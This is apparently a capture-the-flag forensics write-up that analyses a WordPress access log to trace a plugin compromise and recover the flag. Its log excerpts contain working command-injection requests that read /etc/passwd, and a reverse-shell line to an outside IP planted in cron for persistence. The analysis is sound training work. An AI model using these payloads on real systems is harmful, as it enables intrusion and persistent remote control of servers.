---
layout: default
title: Wide
---

# [Hack The Boo 2023](index.md) - Forensics - Vulnerable Season

> Halloween season is a very busy season for all of us. Especially for web page administrators. Too many Halloween-themed parties to attend, too many plugins to manage. Unfortunately, our admin didn't update the plugins used by our WordPress site and as a result, we got pwned. Can you help us investigate the incident by analyzing the web server logs?

We are provided with a single file - `access.log`.

```
192.168.25.1 - - [28/Sep/2023:00:46:16 -0400] "GET /wordpress/wp-includes/js/zxcvbn.min.js HTTP/1.1" 200 400401 "http://johnathan.dev/wordpress/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [28/Sep/2023:00:47:41 -0400] "POST /wordpress/wp-login.php HTTP/1.1" 200 3281 "http://johnathan.dev/wordpress/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [28/Sep/2023:00:47:41 -0400] "POST /wordpress/wp-cron.php?doing_wp_cron=1695876461.7606439590454101562500 HTTP/1.1" 200 259 "-" "WordPress/6.3.1; http://johnathan.dev/wordpress"
192.168.25.1 - - [28/Sep/2023:00:47:42 -0400] "GET /wordpress/wp-admin/css/l10n.min.css?ver=6.3.1 HTTP/1.1" 200 1022 "http://johnathan.dev/wordpress/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [28/Sep/2023:00:47:42 -0400] "GET /wordpress/wp-admin/css/forms.min.css?ver=6.3.1 HTTP/1.1" 200 6858 "http://johnathan.dev/wordpress/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [28/Sep/2023:00:47:42 -0400] "GET /wordpress/wp-includes/css/buttons.min.css?ver=6.3.1 HTTP/1.1" 200 1791 "http://johnathan.dev/wordpress/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [28/Sep/2023:00:47:42 -0400] "GET /wordpress/wp-includes/css/dashicons.min.css?ver=6.3.1 HTTP/1.1" 200 36068 "http://johnathan.dev/wordpress/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [28/Sep/2023:00:47:42 -0400] "GET /wordpress/wp-admin/css/login.min.css?ver=6.3.1 HTTP/1.1" 200 2493 "http://johnathan.dev/wordpress/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [28/Sep/2023:00:47:42 -0400] "GET /wordpress/wp-includes/js/jquery/jquery.min.js?ver=3.7.0 HTTP/1.1" 200 30696 "http://johnathan.dev/wordpress/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [28/Sep/2023:00:47:42 -0400] "GET /wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1 HTTP/1.1" 200 5223 "http://johnathan.dev/wordpress/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
...
```

Looks like it's a web server log.

Skimming the logs, we can see that `82.179.92.206` is likely "dirbusting" this server to find vulnerabilities.

```
...
82.179.92.206 - - [28/Sep/2023:05:13:53 -0400] "GET /wordpress/.env-sample HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
82.179.92.206 - - [28/Sep/2023:05:13:53 -0400] "GET /wordpress/.env.dev HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
82.179.92.206 - - [28/Sep/2023:05:13:53 -0400] "GET /wordpress/.env.dev.local HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
82.179.92.206 - - [28/Sep/2023:05:13:53 -0400] "GET /wordpress/.env.development.sample HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
82.179.92.206 - - [28/Sep/2023:05:13:53 -0400] "GET /wordpress/.env.development.local HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
82.179.92.206 - - [28/Sep/2023:05:13:53 -0400] "GET /wordpress/.env.docker HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
...
```

And judging by the end of the log, it looks like the bad guy got in, and the server admin was likely kicked out

```
68.124.212.176 - - [28/Sep/2023:05:30:36 -0400] "POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1" 200 1913 "http://johnathan.dev/wordpress/wp-login.php?action=lostpassword" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43"
68.124.212.176 - - [28/Sep/2023:05:30:37 -0400] "POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1" 200 1913 "http://johnathan.dev/wordpress/wp-login.php?action=lostpassword" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43"
68.124.212.176 - - [28/Sep/2023:05:30:37 -0400] "POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1" 200 1913 "http://johnathan.dev/wordpress/wp-login.php?action=lostpassword" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43"
68.124.212.176 - - [28/Sep/2023:05:30:37 -0400] "POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1" 200 1913 "http://johnathan.dev/wordpress/wp-login.php?action=lostpassword" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43"
68.124.212.176 - - [28/Sep/2023:05:30:37 -0400] "POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1" 200 1913 "http://johnathan.dev/wordpress/wp-login.php?action=lostpassword" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43"
68.124.212.176 - - [28/Sep/2023:05:30:38 -0400] "POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1" 200 1913 "http://johnathan.dev/wordpress/wp-login.php?action=lostpassword" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43"
```

Starting on line 11473 we can see that the attacker was able to access some tiles that they shouldn't, judging by the HTTP status codes (200 instead of 404) 
```
82.179.92.206 - - [28/Sep/2023:05:16:46 -0400] "GET /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:id:NULL:NULL HTTP/1.1" 200 539 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
82.179.92.206 - - [28/Sep/2023:05:17:03 -0400] "GET /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL HTTP/1.1" 200 493 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
82.179.92.206 - - [28/Sep/2023:05:17:44 -0400] "GET /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:cat%20/etc/passwd:NULL:NULL HTTP/1.1" 200 544 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
82.179.92.206 - - [28/Sep/2023:05:18:23 -0400] "GET /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:pwd:NULL:NULL HTTP/1.1" 200 522 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
82.179.92.206 - - [28/Sep/2023:05:21:22 -0400] "GET /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20%22sh%20-i%20%3E&%20/dev/tcp/82.179.92.206/7331%200%3E&1%22%20%3E%20/etc/cron.daily/testconnect%20&&%20Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo%20$Mz$Tz$Vz$az$Kz$Oz|base64%20-d|rev:NULL:NULL HTTP/1.1" 200 512 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```

Knowing that the flag is in this log file somewhere, I'm looking for larger blobs of code or encoded text. I spot something on line 11477:
```
field=field:exec:echo%20%22sh%20-i%20%3E&%20/dev/tcp/82.179.92.206/7331%200%3E&1%22%20%3E%20/etc/cron.daily/testconnect%20&&%20Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo%20$Mz$Tz$Vz$az$Kz$Oz|base64%20-d|rev:NULL:NULL
```
If we urldecode this it's a bit more readable - clearly some commands for a Linux system of some sort - a reverse shell hidden in cron so that it runs daily (granting persistence). 
```bash
field=field:exec:echo "sh -i >& /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect && Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64 -d|rev:NULL:NULL
```

The rest of this line looks fishy though - like it's hidden data rather than malicious code... I'd expect it to _run_ something, not deobfuscate it into an `echo` command and then bade64 decoding it with `base64 -d`.

```bash
Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64
```
```
}r3Nn1gEb_4_t5yl4n@_g0L{BTH
```

Lets put the `|rev` back on the end to put that the right way around...

```bash
Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64|rev
```

It looks like some bash obfuscation happening here, but this looks like if we just copy this part of it out and run it in bash, it should decode it and display it.

```
HTB{L0g_@n4ly5t_4_bEg1nN3r}
```